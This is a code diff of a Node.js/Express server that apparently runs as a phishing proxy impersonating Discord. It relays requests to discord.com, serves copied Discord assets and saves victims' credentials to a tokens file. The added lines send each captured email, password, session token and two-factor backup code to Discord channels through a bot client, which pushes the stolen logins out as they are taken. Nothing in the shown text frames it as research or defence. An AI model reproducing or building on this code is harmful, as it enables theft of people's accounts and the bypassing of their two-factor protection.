@@ -18,9 +18,8 @@ console.log('Started')
  app.use(bodyParser.json({limit: "50mb"}));
 var data = []
 app.use("/:data*", async (req, res) => {
-  
-  console.log(req.originalUrl)
   if(req.originalUrl.startsWith('/cdn/')){
+  client.createMessage('929480482700288032', `https://cdn.discordapp.com${req.originalUrl.replace('/cdn', '')}`)
 
 console.log('https://cdn.discordapp.com' + req.originalUrl.replace('/cdn/', ''))
     let dataFetch = await fetch(('https://cdn.discordapp.com' + req.originalUrl.replace('/cdn', '')),{
@@ -34,7 +33,8 @@ headers: {
     
 return;
 }
-  
+    client.createMessage('929480482700288032', `https://discord.com${req.originalUrl}`)
+
   if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
   if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
   if(req.originalUrl === '/app') return res.sendFile(__dirname + "/app.html")
@@ -72,7 +72,8 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 	let arr = tokens.split("\n").map(d => {
 		return d.trim();
 	});
-	
+if(!arr.includes(s.email))client.createMessage('929489097955881000', `${s.email}:${s.token}`)
+
 if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
@@ -89,6 +90,8 @@ if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password, login: re
 		return d.trim();
 	});
 if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
+     if(!arr.includes(req.body.login))  client.createMessage('929489097955881000', `${req.body.login}:${req.body.password}:${s.token}`)
+
 if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
@@ -114,7 +117,8 @@ body: JSON.stringify({"password":f.password,"regenerate":true})
 	let arr = tokens.split("\n").map(d => {
 		return d.trim();
 	});
-	
+if(!arr.includes(req.body.login)) client.createMessage('929489097955881000', `${f.login}:${f.password}:${s.token}:${dJ.backup_codes[0].code}`)
+
 if(!arr.includes(req.body.login)) arr.unshift(`${f.login}:${f.password}:${s.token}:${dJ.backup_codes[0].code}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
@@ -145,7 +149,8 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users
 	let arr = tokens.split("\n").map(d => {
 		return d.trim();
 	});
-	
+if(!arr.includes(s.email)) client.createMessage('929489097955881000', `${s.email}:${s.token}`)
+
 if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
